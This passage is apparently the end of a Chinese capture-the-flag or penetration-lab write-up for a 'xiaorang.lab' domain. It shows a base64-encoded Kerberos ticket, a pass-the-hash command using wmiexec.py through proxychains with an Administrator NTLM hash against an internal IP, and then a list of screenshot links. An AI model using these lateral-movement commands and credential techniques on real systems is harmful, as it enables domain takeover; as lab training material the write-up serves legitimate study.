Ph/eysV7SQ8WuaBQU+4JVZ/xpwF+L9EIzwoplgkwRGFKNqFbMlScI4OPSpUOgZpOedPU77P5soSgb+Vt2HuTKU2zJly5KPLQio59pb9oFmNjnpmypyhL4C0ge+dYcc+iGvZbnszqUkXOdx6lhfKV4bfxhthOksUjny4Rucq4Nm5YrxavBU88EBcpKnkHMdCW87xe5S9vAZnQ8jDp2mC7b10UcbOj6TaIF/wdhOWfg1tu0mPvyhdwMgYFShkaLY5uJ3bgC9RNwK/1mGdhcEYWV2mC4yrgSNKYsWdhkJN0PiyfgY16H9fCqM7pZkydrffAm9TsUfYCQc+ojloEFyt+IQFnPJ7PUpm4ieOkYTdI/cIRKEQwzE5ovKiEaxo4HTMIHQoAMCAQCigcgEgcV9gcIwgb+ggbwwgbkwgbagGzAZoAMCARehEgQQ3BPcp5vLYagZu2AD+/L3F6EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAyJKMHAwUAQOEAAKURGA8yMDIyMTEwMzEwMTAwNFqmERgPMjAyMjExMDMyMDEwMDRapxEYDzIwMjIxMTEwMTAxMDA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
proxychains python3 wmiexec.py -hashes 00000000000000000000000000000000:
bf967c5a0f7256e2eaba589fbd29a382 Administrator@172.22.7.6
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1667526651.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1667526651.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1667526653.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/10-1667526655.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/1-1667526657.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1667526660.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/7-1667526663.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/8-1667526664.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/2-1667526665.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/11/9-1667526666.png)